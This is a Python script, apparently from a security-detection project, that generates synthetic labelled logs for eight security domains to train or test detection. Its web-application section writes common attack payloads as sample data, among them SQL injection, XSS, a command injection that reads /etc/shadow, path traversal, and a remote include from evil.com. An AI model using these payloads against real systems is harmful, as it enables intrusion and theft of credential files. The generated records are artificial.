"""
SENTINEL-AI — Synthetic Log Generator (All 8 Domains)
=======================================================
Generates realistic security event logs for all 8 organizational security domains.

Features:
  - All records tagged record_type='synthetic'
  - Configurable attack ratio (default 15%)
  - Realistic IP pools, usernames, timestamps
  - 8 distinct attack patterns per domain
  - Consistent with Common Event Schema (CES)

Run: python scripts/dataset_preparation/06_synthetic_generator.py

Outputs:
  data/raw/synthetic/<domain>_synthetic_raw.log  (raw log strings)
  data/processed/normalized/<domain>_synthetic_ces.csv
  data/processed/samples/<domain>_synthetic_sample.csv
"""

import sys
import json
import random
import socket
import struct
from pathlib import Path
from datetime import datetime, timezone, timedelta
from typing import Callable

ROOT     = Path(__file__).resolve().parents[2]
NORM_DIR = ROOT / "data" / "processed" / "normalized"
SAMP_DIR = ROOT / "data" / "processed" / "samples"
RAW_SYNC = ROOT / "data" / "raw"    / "synthetic"
NORM_DIR.mkdir(parents=True, exist_ok=True)
SAMP_DIR.mkdir(parents=True, exist_ok=True)
RAW_SYNC.mkdir(parents=True, exist_ok=True)

sys.path.insert(0, str(ROOT / "scripts" / "dataset_preparation"))
from schema import (build_record, CES_COLUMNS, SEVERITY_INFO, SEVERITY_LOW,
                    SEVERITY_MEDIUM, SEVERITY_HIGH, SEVERITY_CRITICAL,
                    synthetic_source)

# ─── Shared helpers ───────────────────────────────────────────────────────────
_rng = random.Random(2026)

def _rand_ip(private: bool = True) -> str:
    if private:
        prefix = _rng.choice(["10.10", "172.16", "192.168"])
        return f"{prefix}.{_rng.randint(0,254)}.{_rng.randint(1,254)}"
    octets = (_rng.randint(1, 254), _rng.randint(0, 254),
              _rng.randint(0, 254), _rng.randint(1, 254))
    return ".".join(str(o) for o in octets)

def _rand_port(well_known: bool = False) -> int:
    return _rng.randint(1, 1023) if well_known else _rng.randint(1024, 65535)

def _rand_ts(base: datetime, span_days: int = 30) -> datetime:
    return base + timedelta(seconds=_rng.randint(0, span_days * 86400))

def _ts_str(ts: datetime) -> str:
    return ts.strftime("%Y-%m-%dT%H:%M:%S+00:00")

# Shared entity pools
USERS = [f"user{str(i).zfill(3)}" for i in range(1, 60)] + [
    "john.doe", "jane.smith", "alice.wang", "bob.chen",
    "carol.kumar", "david.lee", "emily.garcia", "frank.müller",
]
HOSTS = [f"ws-{str(i).zfill(3)}" for i in range(1, 40)] + [
    "srv-web-01", "srv-db-01", "srv-mail-01", "srv-file-01",
    "dc-primary", "dc-secondary", "fw-edge-01", "lb-prod-01",
]
SERVICES = ["apache2", "nginx", "sshd", "mysqld", "postgres",
            "lsass.exe", "winlogon.exe", "cmd.exe", "powershell.exe",
            "python.exe", "java", "node", "redis-server"]

BASE_TS = datetime(2026, 10, 1, 0, 0, 0, tzinfo=timezone.utc)

# ══════════════════════════════════════════════════════════════════════════════
# Domain 1: Network Security
# ══════════════════════════════════════════════════════════════════════════════
def gen_network_security(n: int, attack_ratio: float = 0.15) -> list[dict]:
    """Firewall deny/allow logs + IDS alerts + NetFlow anomalies."""
    ATTACK_TYPES = [
        ("DDoS-SYN-Flood",     SEVERITY_CRITICAL, "TCP",  80),
        ("PortScan-Stealth",   SEVERITY_HIGH,     "TCP",  None),
        ("Botnet-C2",          SEVERITY_HIGH,     "TCP",  4444),
        ("DNS-Tunneling",      SEVERITY_MEDIUM,   "UDP",  53),
        ("ICMP-Flood",         SEVERITY_HIGH,     "ICMP", None),
        ("SMB-Lateral",        SEVERITY_HIGH,     "TCP",  445),
        ("Nmap-Scan",          SEVERITY_MEDIUM,   "TCP",  None),
        ("SQL-Injection-HTTP", SEVERITY_HIGH,     "TCP",  80),
    ]

    records = []
    for _ in range(n):
        is_atk = _rng.random() < attack_ratio
        src_ip = _rand_ip(private=not is_atk)
        dst_ip = _rand_ip(private=True)
        ts     = _rand_ts(BASE_TS)

        if is_atk:
            atype, sev, proto, dport = _rng.choice(ATTACK_TYPES)
            dport = dport or _rng.randint(1, 1024)
            action = "deny"
        else:
            atype, sev, proto = None, SEVERITY_INFO, _rng.choice(["TCP", "UDP"])
            dport = _rng.choice([80, 443, 22, 25, 3306, 5432, 8080])
            action = "allow"

        sport = _rand_port()
        pkts  = _rng.randint(1, 100000) if is_atk else _rng.randint(1, 500)
        bytes_= pkts * _rng.randint(40, 1500)

        raw = (f"[FIREWALL] {_ts_str(ts)} src={src_ip}:{sport} "
               f"dst={dst_ip}:{dport} proto={proto} "
               f"action={action} packets={pkts} bytes={bytes_} "
               f"label={'ATTACK:'+atype if is_atk else 'BENIGN'}")

        records.append(build_record(
            domain         = "network_security",
            source_dataset = synthetic_source("network_security"),
            record_type    = "synthetic",
            timestamp      = ts,
            event_type     = "network",
            severity       = sev,
            action         = action,
            raw_log        = raw,
            src_ip         = src_ip,
            dst_ip         = dst_ip,
            src_port       = sport,
            dst_port       = dport,
            protocol       = proto,
            is_attack      = is_atk,
            attack_type    = atype,
            extra_fields   = {"packets": pkts, "bytes": bytes_, "direction": "inbound"},
        ))
    return records


# ══════════════════════════════════════════════════════════════════════════════
# Domain 2: Endpoint Security
# ══════════════════════════════════════════════════════════════════════════════
def gen_endpoint_security(n: int, attack_ratio: float = 0.15) -> list[dict]:
    """Sysmon-style process, file, network events from endpoints."""
    ATTACK_TYPES = [
        ("MalwareExecution",    SEVERITY_CRITICAL, "process"),
        ("RansomwareEncrypt",   SEVERITY_CRITICAL, "file"),
        ("PrivilegeEscalation", SEVERITY_HIGH,     "process"),
        ("PersistenceRegEdit",  SEVERITY_HIGH,     "registry"),
        ("MimikatzDump",        SEVERITY_CRITICAL, "process"),
        ("PowerShellObfusc",    SEVERITY_HIGH,     "process"),
        ("LateralMovementPSExec",SEVERITY_HIGH,    "network"),
        ("DLLInjection",        SEVERITY_HIGH,     "process"),
    ]
    BENIGN_PROCS = ["chrome.exe", "outlook.exe", "excel.exe",
                    "winword.exe", "teams.exe", "slack.exe", "notepad.exe"]
    MAL_PROCS    = ["mimikatz.exe", "psexec.exe", "cobalt.exe",
                    "nc.exe", "meterpreter.exe", "powershell.exe",
                    "wscript.exe", "cscript.exe", "regsvr32.exe"]

    records = []
    for _ in range(n):
        is_atk = _rng.random() < attack_ratio
        host   = _rng.choice(HOSTS)
        user   = _rng.choice(USERS)
        ts     = _rand_ts(BASE_TS)

        if is_atk:
            atype, sev, etype = _rng.choice(ATTACK_TYPES)
            proc = _rng.choice(MAL_PROCS)
            fpath = _rng.choice([
                f"C:\\Temp\\{proc}", f"C:\\Users\\{user}\\Downloads\\{proc}",
                f"C:\\Windows\\System32\\{proc}",
            ])
        else:
            atype, sev = None, SEVERITY_INFO
            etype = _rng.choice(["process", "file", "network"])
            proc  = _rng.choice(BENIGN_PROCS)
            fpath = f"C:\\Program Files\\{proc.replace('.exe','')}"

        pid = _rng.randint(1000, 65535)
        raw = (f"[SYSMON] EventID={_rng.choice([1,3,7,8,10,11])} "
               f"ts={_ts_str(ts)} host={host} user={user} "
               f"process={proc} pid={pid} path={fpath} "
               f"label={'MALICIOUS:'+atype if is_atk else 'BENIGN'}")

        records.append(build_record(
            domain         = "endpoint_security",
            source_dataset = synthetic_source("endpoint_security"),
            record_type    = "synthetic",
            timestamp      = ts,
            event_type     = etype,
            severity       = sev,
            action         = "execute" if etype == "process" else "access",
            raw_log        = raw,
            hostname       = host,
            username       = user,
            process_name   = proc,
            file_path      = fpath,
            src_ip         = _rand_ip(),
            is_attack      = is_atk,
            attack_type    = atype,
            extra_fields   = {"pid": pid, "event_id": _rng.choice([1,3,7,8,10,11])},
        ))
    return records


# ══════════════════════════════════════════════════════════════════════════════
# Domain 3: Cloud Infrastructure
# ══════════════════════════════════════════════════════════════════════════════
def gen_cloud_infrastructure(n: int, attack_ratio: float = 0.15) -> list[dict]:
    """AWS CloudTrail-style events."""
    ATTACK_TYPES = [
        ("IAMPrivilegeEscalation",   SEVERITY_CRITICAL, "AttachUserPolicy"),
        ("S3DataExfiltration",       SEVERITY_CRITICAL, "GetObject"),
        ("EC2CryptoMining",          SEVERITY_HIGH,     "RunInstances"),
        ("CloudTrailDisabled",       SEVERITY_CRITICAL, "StopLogging"),
        ("SecGroupMisconfiguration", SEVERITY_HIGH,     "AuthorizeSecurityGroupIngress"),
        ("RootAccountUsed",          SEVERITY_CRITICAL, "ConsoleLogin"),
        ("LambdaBackdoor",           SEVERITY_HIGH,     "UpdateFunctionCode"),
        ("SecretsManagerDump",       SEVERITY_HIGH,     "GetSecretValue"),
    ]
    BENIGN_EVENTS = [
        ("DescribeInstances", "ec2.amazonaws.com"),
        ("ListBuckets", "s3.amazonaws.com"),
        ("GetCallerIdentity", "sts.amazonaws.com"),
        ("DescribeSecurityGroups", "ec2.amazonaws.com"),
        ("ListUsers", "iam.amazonaws.com"),
    ]
    REGIONS = ["us-east-1", "us-west-2", "eu-west-1", "ap-south-1"]
    ACCOUNTS = [f"1234567890{i:02d}" for i in range(5)]

    records = []
    for _ in range(n):
        is_atk  = _rng.random() < attack_ratio
        ts      = _rand_ts(BASE_TS)
        region  = _rng.choice(REGIONS)
        account = _rng.choice(ACCOUNTS)
        src_ip  = _rand_ip(private=False)
        user    = _rng.choice(USERS)

        if is_atk:
            atype, sev, event_name = _rng.choice(ATTACK_TYPES)
            service = "iam.amazonaws.com" if "IAM" in atype else "s3.amazonaws.com"
            result  = "Success"
        else:
            atype, sev = None, SEVERITY_INFO
            event_name, service = _rng.choice(BENIGN_EVENTS)
            result = "Success"

        raw = (f"[CLOUDTRAIL] {_ts_str(ts)} account={account} region={region} "
               f"eventName={event_name} service={service} "
               f"sourceIPAddress={src_ip} userAgent=aws-cli/2.x "
               f"user={user} result={result} "
               f"label={'ATTACK:'+atype if is_atk else 'BENIGN'}")

        records.append(build_record(
            domain         = "cloud_infrastructure",
            source_dataset = synthetic_source("cloud_infrastructure"),
            record_type    = "synthetic",
            timestamp      = ts,
            event_type     = "api",
            severity       = sev,
            action         = event_name.lower(),
            raw_log        = raw,
            src_ip         = src_ip,
            username       = user,
            is_attack      = is_atk,
            attack_type    = atype,
            extra_fields   = {"region": region, "account": account,
                               "event_name": event_name, "service": service,
                               "result": result},
        ))
    return records


# ══════════════════════════════════════════════════════════════════════════════
# Domain 4: Identity & Access Management (IAM)
# ══════════════════════════════════════════════════════════════════════════════
def gen_iam(n: int, attack_ratio: float = 0.15) -> list[dict]:
    """Authentication logs — brute force, impossible travel, MFA bypass."""
    ATTACK_TYPES = [
        ("BruteForceSSH",     SEVERITY_HIGH,     "login_failed",  22),
        ("BruteForceRDP",     SEVERITY_HIGH,     "login_failed",  3389),
        ("ImpossibleTravel",  SEVERITY_CRITICAL, "login_success", 443),
        ("MFABypass",         SEVERITY_CRITICAL, "login_success", 443),
        ("CredentialStuffing",SEVERITY_HIGH,     "login_failed",  443),
        ("TokenTheft",        SEVERITY_CRITICAL, "token_used",    443),
        ("LDAP-Enum",         SEVERITY_MEDIUM,   "query",         389),
        ("PasswordSpray",     SEVERITY_HIGH,     "login_failed",  88),
    ]
    GEO_LOCATIONS = ["IN", "US", "CN", "RU", "BR", "GB", "DE", "UA"]

    records = []
    for _ in range(n):
        is_atk = _rng.random() < attack_ratio
        ts     = _rand_ts(BASE_TS)
        user   = _rng.choice(USERS)
        src_ip = _rand_ip(private=not is_atk)

        if is_atk:
            atype, sev, action, dport = _rng.choice(ATTACK_TYPES)
            result = "success" if "success" in action or "used" in action else "failed"
            geo    = _rng.choice([g for g in GEO_LOCATIONS if g not in ["IN", "US"]])
            attempts = _rng.randint(50, 2000) if "Brute" in atype else 1
        else:
            atype, sev = None, SEVERITY_INFO
            action  = "login_success"
            dport   = _rng.choice([22, 443, 3389, 389])
            result  = "success"
            geo     = _rng.choice(["IN", "US"])
            attempts = 1

        raw = (f"[AUTH] {_ts_str(ts)} user={user} src_ip={src_ip} "
               f"action={action} dst_port={dport} result={result} "
               f"geo={geo} attempts={attempts} "
               f"label={'ATTACK:'+atype if is_atk else 'BENIGN'}")

        records.append(build_record(
            domain         = "iam",
            source_dataset = synthetic_source("iam"),
            record_type    = "synthetic",
            timestamp      = ts,
            event_type     = "auth",
            severity       = sev,
            action         = action,
            raw_log        = raw,
            src_ip         = src_ip,
            dst_ip         = _rand_ip(private=True),
            dst_port       = dport,
            username       = user,
            hostname       = _rng.choice(HOSTS),
            is_attack      = is_atk,
            attack_type    = atype,
            extra_fields   = {"result": result, "geo": geo, "attempts": attempts,
                               "auth_protocol": _rng.choice(["LDAP", "Kerberos", "NTLM", "OAuth2"])},
        ))
    return records


# ══════════════════════════════════════════════════════════════════════════════
# Domain 5: Application Security
# ══════════════════════════════════════════════════════════════════════════════
def gen_application_security(n: int, attack_ratio: float = 0.15) -> list[dict]:
    """WAF + API gateway + web server access logs."""
    ATTACK_TYPES = [
        ("SQLi",           SEVERITY_CRITICAL, "POST /login",     "' OR 1=1 --"),
        ("XSS",            SEVERITY_HIGH,     "GET /search",     "<script>alert(1)</script>"),
        ("LFI",            SEVERITY_HIGH,     "GET /page",       "../../etc/passwd"),
        ("RFI",            SEVERITY_HIGH,     "GET /include",    "http://evil.com/shell.php"),
        ("CmdInjection",   SEVERITY_CRITICAL, "POST /ping",      "; cat /etc/shadow"),
        ("CSRF",           SEVERITY_MEDIUM,   "POST /transfer",  "forged-token"),
        ("BruteForce-API", SEVERITY_HIGH,     "POST /auth/token","multiple-failures"),
        ("PathTraversal",  SEVERITY_HIGH,     "GET /download",   "../../../etc/hosts"),
    ]
    BENIGN_PATHS = [
        "GET /index.html", "GET /api/products", "POST /api/login",
        "GET /api/users/profile", "PUT /api/orders/123", "GET /static/app.js",
        "GET /api/dashboard", "POST /api/search",
    ]
    STATUS_CODES = [200, 200, 200, 201, 204, 301, 304, 400, 401, 403, 404, 500]

    records = []
    for _ in range(n):
        is_atk = _rng.random() < attack_ratio
        ts     = _rand_ts(BASE_TS)
        src_ip = _rand_ip(private=not is_atk)
        host   = "api.company.com"

        if is_atk:
            atype, sev, path, payload = _rng.choice(ATTACK_TYPES)
            status  = _rng.choice([200, 400, 403, 500])
            ua      = _rng.choice([
                "sqlmap/1.7 (https://sqlmap.org)", "Nikto/2.1.6", "curl/7.68.0",
                "python-requests/2.28.0", "masscan/1.0",
            ])
            method  = "POST" if "POST" in path else "GET"
            req_path= path.split()[1] + f"?q={payload[:30].replace(' ','%20')}"
        else:
            atype, sev = None, SEVERITY_INFO
            path   = _rng.choice(BENIGN_PATHS)
            method = path.split()[0]
            req_path = path.split()[1]
            payload = ""
            status  = _rng.choice([200, 200, 200, 201, 204, 301, 304])
            ua      = _rng.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0)",
            ])

        resp_time = _rng.randint(50, 2000) if is_atk else _rng.randint(10, 500)
        raw = (f'[WAF] {_ts_str(ts)} {src_ip} - - "{method} {req_path} HTTP/1.1" '
               f'{status} resp_ms={resp_time} host={host} ua="{ua[:40]}" '
               f'label={"ATTACK:"+atype if is_atk else "BENIGN"}')

        records.append(build_record(
            domain         = "application_security",
            source_dataset = synthetic_source("application_security"),
            record_type    = "synthetic",
            timestamp      = ts,
            event_type     = "web",
            severity       = sev,
            action         = f"http_{method.lower()}",
            raw_log        = raw,
            src_ip         = src_ip,
            dst_ip         = "10.0.1.50",
            dst_port       = 443,
            protocol       = "HTTPS",
            hostname       = host,
            is_attack      = is_atk,
            attack_type    = atype,
            extra_fields   = {"http_method": method, "path": req_path,
                               "status_code": status, "response_ms": resp_time,
                               "user_agent": ua[:80], "payload_snippet": payload[:50]},
        ))
    return records


# ══════════════════════════════════════════════════════════════════════════════
# Domain 6: Data Loss Prevention (DLP)
# ══════════════════════════════════════════════════════════════════════════════
def gen_dlp(n: int, attack_ratio: float = 0.12) -> list[dict]:
    """File transfer, USB, cloud upload, email exfiltration events."""
    ATTACK_TYPES = [
        ("MassCloudUpload",    SEVERITY_CRITICAL, "cloud_upload"),
        ("USBDataTransfer",    SEVERITY_HIGH,     "usb_write"),
        ("EmailExfiltration",  SEVERITY_CRITICAL, "email_send"),
        ("PrintSensitiveDoc",  SEVERITY_MEDIUM,   "print"),
        ("LargeFileTransfer",  SEVERITY_HIGH,     "ftp_upload"),
        ("ScreenCaptureLeak",  SEVERITY_MEDIUM,   "screenshot"),
        ("ClipboardExfil",     SEVERITY_LOW,      "clipboard_copy"),
        ("UnauthorizedRemote", SEVERITY_HIGH,     "remote_access"),
    ]
    DATA_CLASSIFS = ["PUBLIC", "INTERNAL", "CONFIDENTIAL", "RESTRICTED", "TOP_SECRET"]
    FILE_TYPES    = [".docx", ".xlsx", ".pdf", ".zip", ".csv", ".pptx", ".sql", ".py"]

    records = []
    for _ in range(n):
        is_atk = _rng.random() < attack_ratio
        ts     = _rand_ts(BASE_TS)
        user   = _rng.choice(USERS)
        host   = _rng.choice(HOSTS)

        if is_atk:
            atype, sev, action = _rng.choice(ATTACK_TYPES)
            classif = _rng.choice(["CONFIDENTIAL", "RESTRICTED", "TOP_SECRET"])
            size_mb = _rng.uniform(10, 2000) if "Mass" in atype else _rng.uniform(0.5, 50)
            dest    = _rng.choice([
                "external@gmail.com", "dropbox.com", "wetransfer.com",
                "USB-Device-WD-4TB", "123.45.67.89:21",
            ])
        else:
            atype, sev = None, SEVERITY_INFO
            action  = _rng.choice(["file_open", "file_copy_internal", "email_internal"])
            classif = _rng.choice(["PUBLIC", "INTERNAL"])
            size_mb = _rng.uniform(0.01, 5)
            dest    = "internal-share.company.com"

        fname = f"report_2026{_rng.choice(FILE_TYPES)}"
        raw = (f"[DLP] {_ts_str(ts)} user={user} host={host} "
               f"action={action} file={fname} size_mb={size_mb:.2f} "
               f"classification={classif} destination={dest} "
               f"label={'ALERT:'+atype if is_atk else 'NORMAL'}")

        records.append(build_record(
            domain         = "dlp",
            source_dataset = synthetic_source("dlp"),
            record_type    = "synthetic",
            timestamp      = ts,
            event_type     = action.split("_")[0],
            severity       = sev,
            action         = action,
            raw_log        = raw,
            username       = user,
            hostname       = host,
            file_path      = f"C:\\Users\\{user}\\Documents\\{fname}",
            is_attack      = is_atk,
            attack_type    = atype,
            extra_fields   = {"classification": classif, "size_mb": round(size_mb, 2),
                               "destination": dest, "file_type": fname.split(".")[-1]},
        ))
    return records


# ══════════════════════════════════════════════════════════════════════════════
# Domain 7: Insider Threat
# ══════════════════════════════════════════════════════════════════════════════
def gen_insider_threat(n: int, attack_ratio: float = 0.10) -> list[dict]:
    """UEBA-style behavioral events — abnormal access, data hoarding."""
    ATTACK_TYPES = [
        ("AfterHoursAccess",      SEVERITY_MEDIUM,   "resource_access"),
        ("DataHoarding",          SEVERITY_HIGH,     "bulk_download"),
        ("PrivilegedAbuse",       SEVERITY_CRITICAL, "admin_action"),
        ("CompetitorResearch",    SEVERITY_MEDIUM,   "web_browse"),
        ("AccountSharing",        SEVERITY_HIGH,     "concurrent_login"),
        ("CredentialHarvesting",  SEVERITY_CRITICAL, "credential_dump"),
        ("SystemSabotage",        SEVERITY_CRITICAL, "config_change"),
        ("ReconBeforeTermination",SEVERITY_HIGH,     "bulk_access"),
    ]

    records = []
    for _ in range(n):
        is_atk = _rng.random() < attack_ratio
        user   = _rng.choice(USERS)
        host   = _rng.choice(HOSTS)

        if is_atk:
            # After-hours: 10 PM – 5 AM
            hour = _rng.choice(list(range(22, 24)) + list(range(0, 6)))
        else:
            hour = _rng.randint(8, 18)

        day  = _rng.randint(0, 30)
        ts   = BASE_TS + timedelta(days=day, hours=hour,
                                   minutes=_rng.randint(0, 59))

        if is_atk:
            atype, sev, action = _rng.choice(ATTACK_TYPES)
            risk_score = _rng.randint(70, 100)
            anomaly_reasons = _rng.sample([
                "after_hours_access", "unusual_volume", "new_geolocation",
                "peer_group_deviation", "access_sensitive_resource",
                "multiple_failed_prior", "terminated_employee",
            ], k=_rng.randint(2, 4))
        else:
            atype, sev = None, SEVERITY_INFO
            action = _rng.choice(["file_access", "email_send", "web_browse", "login"])
            risk_score = _rng.randint(0, 25)
            anomaly_reasons = []

        raw = (f"[UEBA] {_ts_str(ts)} user={user} host={host} "
               f"action={action} hour={hour} risk_score={risk_score} "
               f"anomaly_reasons={','.join(anomaly_reasons) or 'none'} "
               f"label={'THREAT:'+atype if is_atk else 'NORMAL'}")

        records.append(build_record(
            domain         = "insider_threat",
            source_dataset = synthetic_source("insider_threat"),
            record_type    = "synthetic",
            timestamp      = ts,
            event_type     = "auth" if "login" in action else "file",
            severity       = sev,
            action         = action,
            raw_log        = raw,
            username       = user,
            hostname       = host,
            is_attack      = is_atk,
            attack_type    = atype,
            extra_fields   = {"risk_score": risk_score,
                               "anomaly_reasons": anomaly_reasons,
                               "hour_of_day": hour},
        ))
    return records


# ══════════════════════════════════════════════════════════════════════════════
# Domain 8: Compliance & Governance
# ══════════════════════════════════════════════════════════════════════════════
def gen_compliance(n: int, attack_ratio: float = 0.20) -> list[dict]:
    """Audit events mapped to GDPR/HIPAA/SOC2/ISO27001 controls."""
    VIOLATION_TYPES = [
        ("GDPR-DataBreachUnreported",  SEVERITY_CRITICAL, "data_access",   ["GDPR Art.33", "GDPR Art.34"]),
        ("HIPAA-UnauthorizedPHIAccess",SEVERITY_CRITICAL, "phi_access",    ["HIPAA §164.312"]),
        ("SOC2-AuditLogTampering",     SEVERITY_CRITICAL, "log_delete",    ["SOC2 CC7.2"]),
        ("ISO27001-PolicyViolation",   SEVERITY_HIGH,     "policy_bypass", ["ISO 27001 A.18.1"]),
        ("PCI-ClearTextPAN",           SEVERITY_CRITICAL, "data_exposure", ["PCI DSS Req.3"]),
        ("GDPR-ExcessiveRetention",    SEVERITY_MEDIUM,   "data_query",    ["GDPR Art.5"]),
        ("SOC2-ChangeWithoutApproval", SEVERITY_HIGH,     "config_change", ["SOC2 CC8.1"]),
        ("HIPAA-EncryptionViolation",  SEVERITY_HIGH,     "data_transmit", ["HIPAA §164.312(e)"]),
    ]
    FRAMEWORKS = ["GDPR", "HIPAA", "SOC2", "ISO27001", "PCI-DSS", "NIST-CSF"]

    records = []
    for _ in range(n):
        is_atk = _rng.random() < attack_ratio
        ts     = _rand_ts(BASE_TS)
        user   = _rng.choice(USERS)
        host   = _rng.choice(HOSTS)

        if is_atk:
            atype, sev, action, controls = _rng.choice(VIOLATION_TYPES)
        else:
            atype, sev = None, SEVERITY_INFO
            action   = _rng.choice(["audit_log_created", "policy_reviewed",
                                    "access_review", "encryption_verified"])
            controls = [f"{_rng.choice(FRAMEWORKS)}-compliant"]

        raw = (f"[AUDIT] {_ts_str(ts)} user={user} host={host} "
               f"action={action} controls={','.join(controls)} "
               f"violation={'YES:'+atype if is_atk else 'NO'}")

        records.append(build_record(
            domain         = "compliance",
            source_dataset = synthetic_source("compliance"),
            record_type    = "synthetic",
            timestamp      = ts,
            event_type     = "audit",
            severity       = sev,
            action         = action,
            raw_log        = raw,
            username       = user,
            hostname       = host,
            is_attack      = is_atk,
            attack_type    = atype,
            extra_fields   = {"controls_triggered": controls,
                               "framework": controls[0].split("-")[0] if controls else "",
                               "requires_report": is_atk},
        ))
    return records


# ══════════════════════════════════════════════════════════════════════════════
# Main orchestrator
# ══════════════════════════════════════════════════════════════════════════════
DOMAIN_GENERATORS: dict[str, tuple[Callable, int]] = {
    "network_security":     (gen_network_security,  2000),
    "endpoint_security":    (gen_endpoint_security, 2000),
    "cloud_infrastructure": (gen_cloud_infrastructure, 1500),
    "iam":                  (gen_iam,               1500),
    "application_security": (gen_application_security, 2000),
    "dlp":                  (gen_dlp,               1000),
    "insider_threat":       (gen_insider_threat,    1200),
    "compliance":           (gen_compliance,         800),
}


def main():
    import pandas as pd

    print("\n" + "=" * 60)
    print("  SENTINEL-AI Synthetic Log Generator — All 8 Domains")
    print("=" * 60)

    summary = []
    for domain, (gen_fn, n) in DOMAIN_GENERATORS.items():
        print(f"\n  [{domain}] Generating {n} events...", end=" ", flush=True)
        records = gen_fn(n)

        attacks = sum(1 for r in records if r["is_attack"])
        print(f"✓  attacks={attacks} ({attacks/n*100:.0f}%)")

        # ── Write raw log file ────────────────────────────────────────────────
        raw_path = RAW_SYNC / f"{domain}_synthetic_raw.log"
        with open(raw_path, "w", encoding="utf-8") as f:
            f.write("\n".join(r["raw_log"] for r in records))

        # ── Write normalized CES CSV ──────────────────────────────────────────
        df_rows = []
        for r in records:
            row = {col: r.get(col, "") for col in CES_COLUMNS if col != "extra_fields"}
            row["extra_fields"] = json.dumps(r.get("extra_fields", {}))
            df_rows.append(row)

        df_out = pd.DataFrame(df_rows, columns=CES_COLUMNS)
        norm_path = NORM_DIR / f"{domain}_synthetic_ces.csv"
        samp_path = SAMP_DIR / f"{domain}_synthetic_sample_200.csv"

        df_out.to_csv(norm_path, index=False)
        df_out.sample(n=min(200, len(df_out)), random_state=42).to_csv(samp_path, index=False)

        size_kb = norm_path.stat().st_size / 1024
        summary.append({
            "domain": domain, "total": n, "attacks": attacks,
            "size_kb": round(size_kb, 1),
        })

    # ── Print summary table ──────────────────────────────────────────────────
    print("\n" + "=" * 70)
    print(f"  {'Domain':<30} {'Events':>7} {'Attacks':>8} {'Atk%':>6} {'Size KB':>9}")
    print("  " + "-" * 65)
    grand_total = grand_attacks = 0
    for s in summary:
        pct = s["attacks"] / s["total"] * 100
        print(f"  {s['domain']:<30} {s['total']:>7,} {s['attacks']:>8,} {pct:>5.1f}% {s['size_kb']:>8.1f}")
        grand_total   += s["total"]
        grand_attacks += s["attacks"]
    print("  " + "-" * 65)
    print(f"  {'TOTAL':<30} {grand_total:>7,} {grand_attacks:>8,} "
          f"{grand_attacks/grand_total*100:>5.1f}%")
    print("=" * 70)
    print(f"\n  ✓ Raw logs  → data/raw/synthetic/")
    print(f"  ✓ Normalized→ data/processed/normalized/")
    print(f"  ✓ Samples   → data/processed/samples/")


if __name__ == "__main__":
    main()
